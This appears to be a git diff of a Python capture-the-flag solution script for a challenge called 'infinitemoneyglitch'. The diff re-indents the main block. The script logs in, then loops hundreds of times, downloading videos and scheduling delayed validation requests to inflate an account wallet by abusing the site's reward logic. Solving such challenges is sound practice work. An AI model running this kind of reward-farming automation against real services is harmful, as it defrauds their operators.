@@ -119,48 +119,47 @@ def getHashList():
 
 
 if __name__ == "__main__":
-    ...
-with open("auth", "rt") as authInfo:
-    authInfoValues = authInfo.read()
-
-    email = authInfoValues.split(" ")[0]
-    password = authInfoValues.split(" ")[1]
-
-s = session()
-
-s.get("http://infinitemoneyglitch.chall.malicecyber.com/login")
-
-if login(s, email, password):
-    print("Successful authentication.")
-    print(f"Account wallet : {getWalletAmount(s)} €")
-else:
-    print("Registration needed...")
-    signup(s, email, password)
-    print("registration done.")
-
-
-threadPool = []
-
-print(f"Still {500 - int(getWalletAmount(s)  * 10)} requests to do")
-print(f"Beginning at {time.ctime()}")
-
-for i in range(0, 500 - int(getWalletAmount(s) * 10)):
-    try:
-        videoUUID = getVideoInfo(s)
-        videoHash, videoCode = downloadVideo(s, videoUUID)
-        threadPool.append(
-            threading.Timer(21, validateVideo, [s, videoUUID, videoCode]).start()
-        )
-    except Exception as e:
-        print(e)
-        pass
-
-threadPool.append(
-    threading.Timer(
-        21,
-        print,
-        [
-            f"Done.",
-        ],
-    ).start()
-)
+    with open("auth", "rt") as authInfo:
+        authInfoValues = authInfo.read()
+    
+        email = authInfoValues.split(" ")[0]
+        password = authInfoValues.split(" ")[1]
+    
+    s = session()
+    
+    s.get("http://infinitemoneyglitch.chall.malicecyber.com/login")
+    
+    if login(s, email, password):
+        print("Successful authentication.")
+        print(f"Account wallet : {getWalletAmount(s)} €")
+    else:
+        print("Registration needed...")
+        signup(s, email, password)
+        print("registration done.")
+    
+    
+    threadPool = []
+    
+    print(f"Still {500 - int(getWalletAmount(s)  * 10)} requests to do")
+    print(f"Beginning at {time.ctime()}")
+    
+    for i in range(0, 500 - int(getWalletAmount(s) * 10)):
+        try:
+            videoUUID = getVideoInfo(s)
+            videoHash, videoCode = downloadVideo(s, videoUUID)
+            threadPool.append(
+                threading.Timer(21, validateVideo, [s, videoUUID, videoCode]).start()
+            )
+        except Exception as e:
+            print(e)
+            pass
+    
+    threadPool.append(
+        threading.Timer(
+            21,
+            print,
+            [
+                f"Done.",
+            ],
+        ).start()
+    )
